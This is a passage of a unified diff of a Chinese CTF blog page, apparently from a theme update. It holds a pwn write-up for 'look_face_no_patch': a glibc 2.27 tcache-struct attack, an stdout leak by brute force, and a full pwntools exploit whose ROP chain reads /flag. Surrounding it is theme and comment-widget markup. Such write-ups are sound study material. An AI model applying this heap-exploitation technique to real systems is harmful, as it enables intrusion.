|| v2 &lt; <span class="number">0</span> )</span><br><span class="line">    run();</span><br><span class="line">  s[v2] = <span class="number">10</span>;</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(v2);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; s[i] != <span class="number">10</span>; ++i )</span><br><span class="line">    *((_BYTE *)ptr + i) = s[i];</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -341,243 +371,301 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dele</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">    run();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dele_time &gt; <span class="number">2</span> )</span><br><span class="line">    run();</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  ++dele_time;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>这个题很怪的一点就是我们只能删除当前创建的chunk并且总共只能删除三次，而且nssctf贴心的告诉了我们题目运行的环境是ubuntu18那libc版本就是2.27那就代表存在tcache，在不知道tcache struct attack的情况就直接想放弃了。</p>
-<h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220111181152135.png"
-                      alt="image-20220111181152135"
-                ></p>
+<h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p><img   src="/images/image-20220111181152135.png"  alt="image-20220111181152135"></p>
 <p>首先利用double free让我们创建chunk的fd指针只想自身。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220111181726081.png"
-                      alt="image-20220111181726081"
-                ></p>
+<p><img   src="/images/image-20220111181726081.png"  alt="image-20220111181726081"></p>
 <p>可以看到我们利用爆破最后一个字节修改了tcache struct当中记录counts的值，再观察一下bin的情况</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220111181843257.png"
-                      alt="image-20220111181843257"
-                ></p>
+<p><img   src="/images/image-20220111181843257.png"  alt="image-20220111181843257"></p>
 <p>后面也是一样的。接着我们释放chunk，此时储存tcache struct的chunk进入unsorted bin。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220111182653794.png"
-                      alt="image-20220111182653794"
-                ></p>
+<p><img   src="/images/image-20220111182653794.png"  alt="image-20220111182653794"></p>
 <p>接着我们创建一个0x50大小的chunk(至于为什么我放到代码当中解释)。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220111183252695.png"
-                      alt="image-20220111183252695"
-                ></p>
-<p>接着开始猜stdout的地址。到这一步，成功的概率只有1/256了所以我就不做过程截图了(因为我自己打本地的时候等了五六分钟，他给我来一句程序运行太多，就没了)所以下面直接给exp了。</p>
+<p><img   src="/images/image-20220111183252695.png"  alt="image-20220111183252695"></p>
+<p>接着开始猜stdout的地址。到这一步，成功的概率只有1&#x2F;256了所以我就不做过程截图了(因为我自己打本地的时候等了五六分钟，他给我来一句程序运行太多，就没了)所以下面直接给exp了。</p>
 <h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./look_face_no_patch&quot;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./look_face_no_patch&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">contents</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;cont...&#x27;</span>)</span><br><span class="line">    r.sendline(contents)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boom</span>():</span></span><br><span class="line">    create(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">    delete()</span><br><span class="line">    delete()</span><br><span class="line"></span><br><span class="line">    heap = <span class="number">0x8010</span></span><br><span class="line">    create((p16(heap)+<span class="string">b&#x27;\n&#x27;</span>).ljust(<span class="number">0x30</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    create(<span class="string">b&quot;\n&quot;</span>.ljust(<span class="number">0x30</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    create(<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">    delete()</span><br><span class="line">    create(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x40</span>)<span class="comment"># 放开前面的counts区域，修改后面的tcache_entry指针，并且是tcache_counts为0，为后续做铺垫</span></span><br><span class="line">    stdout = <span class="number">0x8760</span></span><br><span class="line">    create((p16(stdout)+<span class="string">b&#x27;\n&#x27;</span>).ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>))<span class="comment"># 开始爆破stdout的地址(也只需要爆破一位)，这一块chunk是切割的unsorted bin当中的内容，也就是tcache_struct，下去思考一下就能想到我们爆破的是tcache大小为0x40的指针</span></span><br><span class="line">    create((p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x60</span>)+<span class="string">b&#x27;\n&#x27;</span>).ljust(<span class="number">0x30</span>, <span class="string">b&#x27;\x00&#x27;</span>))<span class="comment"># 这一步开始修改结构体内部的值</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> u64(r.recv(<span class="number">8</span>)) != <span class="number">0xfbad1800</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    r.recv(<span class="number">0x20</span>)</span><br><span class="line">    stdout = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">131</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(stdout))</span><br><span class="line">    <span class="comment"># libc = LibcSearcher(&#x27;_IO_2_1_stdout_&#x27;, stdout)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">    <span class="comment"># success(libc.address)</span></span><br><span class="line">    libc_base = stdout-libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">    pop_rdi = <span class="number">0x000000000002155f</span>+libc_base</span><br><span class="line">    pop_rsi = <span class="number">0x0000000000023e8a</span>+libc_base</span><br><span class="line">    pop_rdx = <span class="number">0x0000000000001b96</span>+libc_base</span><br><span class="line">    push_rsp = <span class="number">0x0000000000024ef4</span>+libc_base</span><br><span class="line">    open_addr = libc_base+libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    read_addr = libc_base+libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    write_addr = libc_base+libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    malloc_hook = libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    create((p64(malloc_hook)+<span class="string">b&#x27;\n&#x27;</span>).ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>))<span class="comment"># 这一步我们又是从unsorted bin当中切出来位置，但因为上面用了0x20所以我们修改的tcache_entry是大小为0x80的chunk。后面就是正常的构造ROP了</span></span><br><span class="line">    create((p64(push_rsp)+<span class="string">b&#x27;/flag&#x27;</span>+<span class="string">b&#x27;\n&#x27;</span>).ljust(<span class="number">0x70</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    payload = p64(pop_rdi)+p64(malloc_hook+<span class="number">0x8</span>)+p64(open_addr)+p64(pop_rdi) + \</span><br><span class="line">        p64(<span class="number">3</span>)+p64(pop_rdx)+p64(<span class="number">0x50</span>)+p64(pop_rsi) + \</span><br><span class="line">        p64(malloc_hook+<span class="number">10</span>)+p64(puts)+<span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">    create(payload.ljust(<span class="number">0x70</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = boom()</span><br><span class="line">            <span class="keyword">if</span>(res == <span class="number">0</span>):</span><br><span class="line">                r = process(<span class="string">&#x27;./look_face_no_patch&#x27;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            r = process(<span class="string">&#x27;./look_face_no_patch&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>上面代码解释可能难以理解，所以我画了一张图。</p>
 <p>我们将存放tcache_struct的chunk释放进unsorted bin当中的后续情况如下图：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220111190610152.png"
-                      alt="image-20220111190610152"
-                ></p>
+<p><img   src="/images/image-20220111190610152.png"  alt="image-20220111190610152"></p>
 
-        </div>
+                    
+                </div>
 
-        
-
-        
-            <div class="article-nav">
                 
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2022/01/20/V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B%E5%A4%8D%E7%8E%B0/"
-                        >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">V&amp;N2020 公开赛复现</span>
-                                <span class="post-nav-item">上一篇</span>
-                            </span>
-                        </a>
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/pwn/">pwn</a>
+                                    </li>
+                                
+                            </ul>
+                        
                     </div>
-                
-                
-                    <div class="article-next">
-                        <a class="next"
-                           rel="next"
-                           href="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/"
-                        >
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">长安“战疫”网络安全卫士守护赛wp</span>
-                                <span class="post-nav-item">下一篇</span>
-                            </span>
-                            <span class="right arrow-icon flex-center">
-                              <i class="fas fa-chevron-right"></i>
-                            </span>
-                        </a>
+                    <div>
+                        
                     </div>
-                
-            </div>
-        
+                </div>
 
-        
-            <div class="comment-container">
-                <div class="comments-container">
-    <div id="comment-anchor"></div>
-    <div class="comment-area-title">
-        <i class="fas fa-comments">&nbsp;评论</i>
+                
+                    
+
+<div class="reward-author-container border-box flex-center">
+    <div class="reward-btn border-box flex-center tooltip tooltip-img"
+            data-tooltip-img-url="/images/reward.jpg"
+            data-tooltip-img-trigger="click"
+            data-tooltip-img-style="top: -6px;"
+    >
+        <i class="fa-solid fa-mug-hot"></i>&nbsp;激励牛马，加速创作！
     </div>
-    
+</div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2022/01/20/V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B%E5%A4%8D%E7%8E%B0/"
+                                   title="V&amp;N2020 公开赛复现"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">V&amp;N2020 公开赛复现</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/"
+                                   title="长安“战疫”网络安全卫士守护赛wp"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">长安“战疫”网络安全卫士守护赛wp</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;评论
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">评论插件加载失败</span>
+    <button class="reload keep-button">点击重新加载</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">正在加载评论插件</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
 
         
             
+
     <div class="valine-container">
-        <script 
-                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
         <div id="vcomments"></div>
-        <script >
-            function loadValine() {
-                new Valine({
-                    el: '#vcomments',
-                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
-                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
-                    meta: ['nick', 'mail', 'link'],
-                    avatar: 'wavatar',
-                    enableQQ: true,
-                    placeholder: '😜若有问题请各位大师傅留言评论',
-                    lang: 'zh-CN'.toLowerCase()
-                });
-
-                function getAuthor(language) {
-                    switch (language) {
-                        case 'en':
-                            return 'Author';
-                        case 'zh-CN':
-                            return '博主';
-                        default:
-                            return 'Master';
-                    }
-                }
-
-                // Add "Author" identify
-                const getValineDomTimer = setInterval(() => {
-                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
-                    if (vcards.length > 0) {
-                        let author = '196082';
-
-                        if (author) {
-                            for (let vcard of vcards) {
-                                const vnick_dom = vcard.querySelector('.vhead .vnick');
-                                const vnick = vnick_dom.innerHTML;
-                                if (vnick === author) {
-                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
-                                }
-                            }
-                        }
-                        clearInterval(getValineDomTimer);
-                    } else {
-                        clearInterval(getValineDomTimer);
-                    }
-                }, 2000);
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        ></script>
+        <script 
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        >
+          window.KeepCommentPlugin.initValine = () => {
+            const config = {
+              el: '#vcomments',
+              appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
+              appKey: 'C672AAYGXMkHxztf8ntdLShs',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: '😜若有问题请各位大师傅留言评论',
+              lang: 'zh-CN'.toLowerCase()
             }
 
-            if ('false') {
-                const loadValineTimeout = setTimeout(() => {
-                    loadValine();
-                    clearTimeout(loadValineTimeout);
-                }, 1000);
+            if ('') {
+              config.serverURLs = ''
+            }
+
+            if (window?.Valine) {
+              new Valine(config)
+              window.KeepCommentPlugin.hideLoading()
             } else {
-                window.addEventListener('DOMContentLoaded', loadValine);
+              setTimeout(() => {
+                window.KeepCommentPlugin.initValine()
+              }, 1000)
             }
+          }
+
+          if ('false' === 'true') {
+            setTimeout(() => {
+              window.KeepCommentPlugin.initValine()
+            }, 1200)
+          } else {
+            window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initValine)
+          }
         </script>
     </div>
 
 
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
 
         
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#shell"><span class="nav-text">shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#look-face-no-patch"><span class="nav-text">look_face_no_patch</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#tcache-struct-attack"><span class="nav-text">tcache struct attack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-text">利用方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IO-FILE-leak"><span class="nav-text">_IO_FILE leak</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#flags%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B9%9F%E8%A6%81%E4%BF%AE%E6%94%B9%EF%BC%9F"><span class="nav-text">_flags为什么也要修改？</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E8%88%AC%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-text">一般的利用方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98"><span class="nav-text">解题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E4%BF%9D%E6%8A%A4"><span class="nav-text">检查保护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-text">流程分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-text">利用分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exp"><span class="nav-text">exp</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+        &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2024
+        
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">196082</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
     
-</div>
-
-            </div>
         
-    </div>
-</div>
-
-
-                
-            </div>
-
-        </div>
-
-        <div class="page-main-content-bottom">
-            <footer class="footer">
-    <div class="info-container">
-        <div class="copyright-info info-item">
-            &copy;
+        <div class="deploy-info info-item">
             
-              <span>2021</span>&nbsp;-&nbsp;
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
             
-            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">196082</a>
         </div>
-        
-            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-            <div class="website-count info-item">
-                
-                    <span id="busuanzi_container_site_uv">
-                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
-                    </span>
-                
-                
-                    <span id="busuanzi_container_site_pv">
-                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
-                    </span>
-                
-            </div>
-        
-        <div class="theme-info info-item">
-            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">335.6k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
         </div>
-        
-    </div>
+    
+
+    
 </footer>
 
         </div>
     </div>
 
+    <!-- post tools -->
     
-        <div class="post-tools">
-            <div class="post-tools-container">
-    <ul class="tools-list">
-        <!-- TOC aside toggle -->
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
         
-            <li class="tools-item page-aside-toggle">
-                <i class="fas fa-outdent"></i>
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
             </li>
         
 
-        <!-- go comment -->
+        <!-- PC go comment -->
         
-            <li class="go-comment">
+            <li class="tools-item flex-center go-to-comments">
                 <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
             </li>
         
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
     </ul>
 </div>
 
         </div>
     
 
-    <div class="right-bottom-side-tools">
-        <div class="side-tools-container">
-    <ul class="side-tools-list">
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
         <li class="tools-item tool-font-adjust-plus flex-center">
             <i class="fas fa-search-plus"></i>
         </li>
@@ -586,13 +674,12 @@
             <i class="fas fa-search-minus"></i>
         </li>
 
-        <li class="tools-item tool-expand-width flex-center">
-            <i class="fas fa-arrows-alt-h"></i>
-        </li>
-
-        <li class="tools-item tool-dark-light-toggle flex-center">
-            <i class="fas fa-moon"></i>
-        </li>
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
 
         <!-- rss -->
         
@@ -606,42 +693,45 @@
             </li>
         
 
-        
-            <li class="tools-item tool-scroll-to-top flex-center">
-                <i class="fas fa-arrow-up"></i>
-            </li>
-        
-
+        <!-- to bottom -->
         <li class="tools-item tool-scroll-to-bottom flex-center">
             <i class="fas fa-arrow-down"></i>
         </li>
     </ul>
 
-    <ul class="exposed-tools-list">
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
         <li class="tools-item tool-toggle-show flex-center">
             <i class="fas fa-cog fa-spin"></i>
         </li>
-        
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
     </ul>
 </div>
 
     </div>
 
-    
-        <aside class="page-aside">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#shell"><span class="nav-text">shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#look-face-no-patch"><span class="nav-text">look_face_no_patch</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#tcache-struct-attack"><span class="nav-text">tcache struct attack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-text">利用方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IO-FILE-leak"><span class="nav-text">_IO_FILE leak</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#flags%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B9%9F%E8%A6%81%E4%BF%AE%E6%94%B9%EF%BC%9F"><span class="nav-text">_flags为什么也要修改？</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E8%88%AC%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-text">一般的利用方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98"><span class="nav-text">解题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E4%BF%9D%E6%8A%A4"><span class="nav-text">检查保护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-text">流程分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-text">利用分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exp"><span class="nav-text">exp</span></a></li></ol></li></ol></li></ol></li></ol>
-    </div>
-</div>
-        </aside>
-    
-
-    <div class="image-viewer-container">
-    <img src="">
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
 </div>
 
 
+    <!-- local search -->
     
         <div class="search-pop-overlay">
     <div class="popup search-popup">
@@ -659,7 +749,7 @@
                        class="search-input"
                 >
             </div>
-            <span class="popup-btn-close">
+            <span class="close-popup-btn">
                 <i class="fas fa-times"></i>
             </span>
         </div>
@@ -673,29 +763,76 @@
 
     
 
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
